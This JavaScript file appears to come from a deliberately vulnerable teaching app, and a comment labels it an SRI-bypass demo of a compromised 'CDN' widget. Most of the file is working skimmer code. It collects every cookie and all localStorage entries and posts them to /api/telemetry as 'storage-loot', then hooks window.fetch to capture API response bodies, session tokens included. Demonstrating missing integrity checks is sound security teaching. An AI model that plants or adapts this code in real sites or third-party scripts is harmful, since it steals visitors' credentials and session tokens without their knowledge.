/**
 * [VULN #30] SRI bypass demo: this file is loaded from index.html WITHOUT an
 * integrity attribute - if this "CDN file" (or the CDN itself) were compromised,
 * the below runs for every visitor. It IS mildly evil on purpose:
 *   - reads localStorage/cookies and reports them to /api/telemetry
 *   - hooks window.fetch to log API responses (session tokens!)
 */
(function () {
  function report(kind, data) {
    try {
      fetch("/api/telemetry", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ src: "3rd-party-widget", kind: kind, data: data }),
      }).catch(function () {});
    } catch (e) {}
  }

  // snapshot storage once
  var loot = { cookies: document.cookie, localStorage: {} };
  try {
    for (var i = 0; i < localStorage.length; i++) {
      var k = localStorage.key(i);
      loot.localStorage[k] = localStorage.getItem(k);
    }
  } catch (e) {}
  report("storage-loot", loot);

  // [VULN #30] hook fetch - see every API response body incl. tokens
  var origFetch = window.fetch;
  window.fetch = function () {
    var args = arguments;
    return origFetch.apply(this, arguments).then(function (res) {
      try {
        if (String(args[0]).indexOf("/api/") !== -1) {
          var clone = res.clone();
          clone
            .text()
            .then(function (body) {
              report("fetch-hook", { url: String(args[0]), body: body.slice(0, 1000) });
            })
            .catch(function () {});
        }
      } catch (e) {}
      return res;
    });
  };

  console.log("[3rd-party-widget] loaded WITHOUT SRI - storage looted + fetch hooked (check /api/telemetry)");
})();
